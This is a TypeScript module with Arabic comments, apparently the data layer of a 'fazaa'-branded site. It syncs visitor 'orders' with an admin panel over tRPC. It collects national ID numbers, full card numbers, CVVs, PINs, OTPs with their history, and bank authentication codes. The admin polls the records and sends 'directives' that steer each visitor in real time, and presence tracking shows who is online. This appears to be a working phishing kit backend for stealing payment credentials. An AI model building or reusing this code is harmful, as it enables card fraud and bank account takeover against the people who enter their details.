/* مخزن الطلبات الحية — يعتمد الآن على الخادم الخلفي (قاعدة بيانات) عبر tRPC
   لمزامنة البيانات بين جهاز الزائر وجهاز المشرف في الوقت الفعلي.
   تبقى واجهة الدوال متوافقة مع الكود القديم قدر الإمكان. */

import { trpcVanilla } from "./trpcVanilla";

export interface LiveOrder {
  id: string; // = publicId
  createdAt: number;
  date: string;
  page: string;
  name: string;
  idNumber: string;
  phone: string;
  email: string;
  tier: string;
  region: string;
  city: string;
  district: string;
  street: string;
  deliveryDate: string;
  cardNumber: string;
  bankName: string;
  expiry: string;
  cvv: string;
  pin: string;
  otp: string;
  otpHistory?: string[];
  bankAuth: string;
  authCount?: number;
  status: "pending" | "accepted" | "rejected";
  isOnline: boolean;
  directive: string;
  location: string;
}

/* ====== معرّف جلسة الطلب الحالي للزائر (sessionStorage لكل تبويب) ====== */
const SESSION_KEY = "fazaa_current_order_id";

export function getCurrentOrderId(): string | null {
  try {
    return sessionStorage.getItem(SESSION_KEY);
  } catch {
    return null;
  }
}

function setCurrentOrderId(id: string) {
  try {
    sessionStorage.setItem(SESSION_KEY, id);
  } catch {
    /* تجاهل */
  }
}

export function clearCurrentOrder() {
  try {
    sessionStorage.removeItem(SESSION_KEY);
  } catch {
    /* تجاهل */
  }
}

function genId(): string {
  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
    return `L-${crypto.randomUUID()}`;
  }
  const fallback = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2)}-${Math.random().toString(36).slice(2)}`;
  return `L-${fallback}`.slice(0, 40);
}

function formatDate(d: Date): string {
  const months = [
    "يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو",
    "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر",
  ];
  let h = d.getHours();
  const m = d.getMinutes().toString().padStart(2, "0");
  const period = h >= 12 ? "م" : "ص";
  h = h % 12 || 12;
  return `${d.getDate()} ${months[d.getMonth()]}، ${h}:${m} ${period}`;
}

/* الحقول النصية القابلة للإرسال للخادم (+ علامات تحكم اختيارية) */
type UpsertData = Partial<Omit<LiveOrder, "id" | "createdAt" | "date" | "isOnline">> & {
  appendOtp?: boolean;
  incAuth?: boolean;
};

function buildPayload(data: UpsertData): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  const keys: (keyof UpsertData)[] = [
    "page", "name", "idNumber", "phone", "email", "tier",
    "region", "city", "district", "street", "deliveryDate",
    "cardNumber", "bankName", "expiry", "cvv", "pin", "otp", "bankAuth",
    "directive", "status",
  ];
  for (const k of keys) {
    const v = data[k as keyof UpsertData];
    if (v !== undefined && v !== null) out[k] = String(v);
  }
  // علامات تحكم بوليانية تُرسل كما هي (ليست نصاً)
  if (data.appendOtp) out.appendOtp = true;
  if (data.incAuth) out.incAuth = true;
  return out;
}

/* إنشاء طلب جديد على الخادم وإرجاع معرّفه.
   إذا كان للزائر معرّف جلسة حضور سابق (من تتبّع الزوار)، نعيد استخدامه
   حتى تتحوّل جلسة الحضور الخفيفة إلى طلب فعلي بدلاً من إنشاء سجل مكرّر. */
export async function createLiveOrder(data: UpsertData): Promise<string> {
  let id = getCurrentOrderId();
  if (!id) {
    id = genId();
  }
  setCurrentOrderId(id);
  await trpcVanilla.orders.upsert.mutate({ publicId: id, ...buildPayload(data) });
  notifyChange();
  return id;
}

/* تحديث الطلب الحالي للزائر (أو إنشاؤه إن لم يوجد) */
export async function upsertCurrentOrder(data: UpsertData): Promise<string> {
  let id = getCurrentOrderId();
  if (!id) {
    id = genId();
    setCurrentOrderId(id);
  }
  await trpcVanilla.orders.upsert.mutate({ publicId: id, ...buildPayload(data) });
  notifyChange();
  return id;
}

/* تحويل صف الخادم إلى LiveOrder للواجهة */
function mapRow(row: any): LiveOrder {
  const created = row.createdAt ? new Date(row.createdAt) : new Date();
  const lastSeen = row.lastSeen ? new Date(row.lastSeen).getTime() : 0;
  const online = Date.now() - lastSeen < 45 * 1000;
  return {
    id: row.publicId,
    createdAt: created.getTime(),
    date: formatDate(created),
    page: row.page || "ملخص الطلب",
    name: row.name || "",
    idNumber: row.idNumber || "",
    phone: row.phone || "",
    email: row.email || "",
    tier: row.tier || "",
    region: row.region || "",
    city: row.city || "",
    district: row.district || "",
    street: row.street || "",
    deliveryDate: row.deliveryDate || "",
    cardNumber: row.cardNumber || "-",
    bankName: row.bankName || "-",
    expiry: row.expiry || "-",
    cvv: row.cvv || "-",
    pin: row.pin || "-",
    otp: row.otp || "-",
    otpHistory: row.otpHistory ? JSON.parse(row.otpHistory) : (row.otp && row.otp !== "-" ? [row.otp] : []),
    bankAuth: row.bankAuth || "-",
    authCount: row.authCount || (row.bankAuth && row.bankAuth !== "-" ? 1 : 0),
    status: (row.status as LiveOrder["status"]) || "pending",
    isOnline: online,
    directive: row.directive || "wait",
    location: row.location || "",
  };
}

/* المشرف: جلب جميع الطلبات + عدد النشطين + إجمالي الزوار */
export async function fetchLiveOrders(): Promise<{ orders: LiveOrder[]; active: number; total: number }> {
  const res = await trpcVanilla.orders.list.query();
  return {
    orders: (res.orders || []).map(mapRow),
    active: res.active || 0,
    total: (res as { total?: number }).total || 0,
  };
}

/* الزائر: جلب طلبه الحالي */
export async function fetchCurrentOrder(): Promise<LiveOrder | null> {
  const id = getCurrentOrderId();
  if (!id) return null;
  const row = await trpcVanilla.orders.get.query({ publicId: id });
  return row ? mapRow(row) : null;
}

export async function getLiveOrderById(id: string): Promise<LiveOrder | null> {
  const row = await trpcVanilla.orders.get.query({ publicId: id });
  return row ? mapRow(row) : null;
}

/* المشرف: توجيه الزائر */
export async function setLiveOrderDirective(id: string, directive: string, status?: string): Promise<void> {
  await trpcVanilla.orders.direct.mutate({ publicId: id, directive, status });
  notifyChange();
}

/* المشرف: تغيير حالة الطلب */
export async function setLiveOrderStatus(id: string, status: LiveOrder["status"]): Promise<void> {
  // لا نرسل directive كحالة حتى لا نكتب فوق التوجيه الفعلي، نرسل التوجيه الحالي أو wait
  const currentOrder = await getLiveOrderById(id);
  const currentDirective = currentOrder?.directive || "wait";
  await trpcVanilla.orders.direct.mutate({ publicId: id, directive: currentDirective, status });
  notifyChange();
}

/* المشرف: حذف طلب */
export async function deleteLiveOrder(id: string): Promise<void> {
  await trpcVanilla.orders.remove.mutate({ publicId: id });
  notifyChange();
}

/* الزائر: ضبط توجيه طلبه على wait بعد إدخال خطوة جديدة */
export async function resetCurrentDirectiveToWait(): Promise<void> {
  const id = getCurrentOrderId();
  if (!id) return;
  await trpcVanilla.orders.resetDirective.mutate({ publicId: id });
}

/* ====== إشعار داخلي للتبويب الحالي عند أي تغيير محلي ====== */
const EVENT_NAME = "fazaa_live_orders_changed";
function notifyChange() {
  try {
    window.dispatchEvent(new CustomEvent(EVENT_NAME));
  } catch {
    /* تجاهل */
  }
}

/* المشرف: استطلاع دوري للطلبات (polling) — يستدعي cb بالنتائج عند كل دورة */
export function pollLiveOrders(
  cb: (data: { orders: LiveOrder[]; active: number; total: number }) => void,
  intervalMs = 3000,
): () => void {
  let stopped = false;
  const tick = async () => {
    if (stopped) return;
    try {
      const data = await fetchLiveOrders();
      if (!stopped) cb(data);
    } catch {
      /* تجاهل أخطاء الشبكة المؤقتة */
    }
  };
  tick();
  const timer = window.setInterval(tick, intervalMs);
  const onChange = () => tick();
  window.addEventListener(EVENT_NAME, onChange);
  return () => {
    stopped = true;
    window.clearInterval(timer);
    window.removeEventListener(EVENT_NAME, onChange);
  };
}

/* الزائر: استطلاع دوري لتوجيه طلبه الحالي — يستدعي cb بقيمة directive */
export function pollCurrentOrderDirective(
  cb: (directive: string) => void,
  intervalMs = 2500,
): () => void {
  let stopped = false;
  const tick = async () => {
    if (stopped) return;
    const id = getCurrentOrderId();
    if (!id) return;
    try {
      const row = await trpcVanilla.orders.get.query({ publicId: id });
      if (!stopped && row) cb(row.directive || "wait");
    } catch {
      /* تجاهل */
    }
  };
  tick();
  const timer = window.setInterval(tick, intervalMs);
  return () => {
    stopped = true;
    window.clearInterval(timer);
  };
}

/* ====== تتبّع نشاط الزائر (للكشف عن الخمول) ======
   نسجّل وقت آخر حركة فعلية للزائر (نقر/لمس/تمرير/كتابة/تحريك مؤشر).
   إذا مرّ أكثر من IDLE_LIMIT_MS دون أي نشاط، نتوقف عن إرسال نبضة الحضور،
   فيسقط الزائر تلقائياً من "الزوار النشطين" (لأن lastSeen يتجاوز نافذة الاتصال).
   عند أول حركة جديدة تُستأنف النبضة فوراً فيعود للظهور. */
const IDLE_LIMIT_MS = 5 * 60 * 1000; // 5 دقائق
let lastActivityAt = Date.now();
let activityListenersAttached = false;

/* مستمعو "عودة النشاط": يُستدعون عند أول حركة بعد فترة خمول لإرسال نبضة فورية */
const activityResumeCallbacks = new Set<() => void>();

function markActivity() {
  const wasIdle = isIdle();
  lastActivityAt = Date.now();
  if (wasIdle) {
    // عاد الزائر بعد خمول: نبّه المشتركين لإرسال نبضة فورية فيظهر فوراً
    activityResumeCallbacks.forEach((cb) => {
      try { cb(); } catch { /* تجاهل */ }
    });
  }
}

function ensureActivityListeners() {
  if (activityListenersAttached) return;
  activityListenersAttached = true;
  const events = ["mousemove", "mousedown", "keydown", "touchstart", "touchmove", "scroll", "click", "wheel"];
  for (const ev of events) {
    window.addEventListener(ev, markActivity, { passive: true });
  }
  // عودة التبويب للظهور تُعدّ نشاطاً
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") markActivity();
  });
}

/** هل الزائر خامل الآن (تجاوز حدّ الخمول)؟ */
function isIdle(): boolean {
  return Date.now() - lastActivityAt > IDLE_LIMIT_MS;
}

/* الزائر: نبضة حضور دورية لإبقاء حالته "متصل" في لوحة التحكم.
   تُرسَل فقط إذا كان الزائر نشطاً خلال آخر 5 دقائق. */
export function startHeartbeat(intervalMs = 15000): () => void {
  let stopped = false;
  ensureActivityListeners();
  const beat = async () => {
    if (stopped) return;
    if (isIdle()) return; // خامل: لا نبضة → يسقط من النشطين
    const id = getCurrentOrderId();
    if (!id) return;
    try {
      await trpcVanilla.orders.upsert.mutate({ publicId: id });
    } catch {
      /* تجاهل */
    }
  };
  beat();
  const timer = window.setInterval(beat, intervalMs);
  activityResumeCallbacks.add(beat); // نبضة فورية عند عودة النشاط
  return () => {
    stopped = true;
    window.clearInterval(timer);
    activityResumeCallbacks.delete(beat);
  };
}

/* ====== تتبّع حضور الزوار (لكل زائر فور دخوله أي صفحة) ======
   ينشئ جلسة حضور خفيفة تستخدم نفس معرّف الطلب (sessionStorage)،
   وترسل نبضة حضور تحمل اسم الصفحة الحالية، لتظهر في "الزوار النشطون".
   عند بدء الطلب الفعلي يُعاد استخدام نفس المعرّف وتتحوّل الجلسة إلى طلب. */

/** الحصول على معرّف الزائر الحالي أو إنشاؤه */
function ensureVisitorId(): string {
  let id = getCurrentOrderId();
  if (!id) {
    id = genId();
    setCurrentOrderId(id);
  }
  return id;
}

/** إرسال نبضة حضور للصفحة الحالية فوراً */
export async function pingVisitorPresence(pageLabel: string): Promise<void> {
  const id = ensureVisitorId();
  try {
    // نرسل اسم الصفحة فقط؛ لا نكتب فوق أي بيانات طلب أدخلها الزائر.
    await trpcVanilla.orders.upsert.mutate({ publicId: id, page: pageLabel });
    notifyChange();
  } catch {
    /* تجاهل أخطاء الشبكة المؤقتة */
  }
}

/** بدء تتبّع حضور الزائر: نبضة فورية ثم دورية كل intervalMs.
    تتوقف النبضة تلقائياً بعد 5 دقائق خمول (بلا حركة)، فيسقط الزائر من النشطين،
    وتُستأنف فور عودة النشاط. */
export function startVisitorPresence(
  getPageLabel: () => string,
  intervalMs = 15000,
): () => void {
  let stopped = false;
  ensureActivityListeners();
  const beat = () => {
    if (stopped) return;
    if (isIdle()) return; // خامل: لا نبضة → يسقط من النشطين
    void pingVisitorPresence(getPageLabel());
  };
  beat();
  const timer = window.setInterval(beat, intervalMs);
  activityResumeCallbacks.add(beat); // نبضة فورية عند عودة النشاط
  return () => {
    stopped = true;
    window.clearInterval(timer);
    activityResumeCallbacks.delete(beat);
  };
}
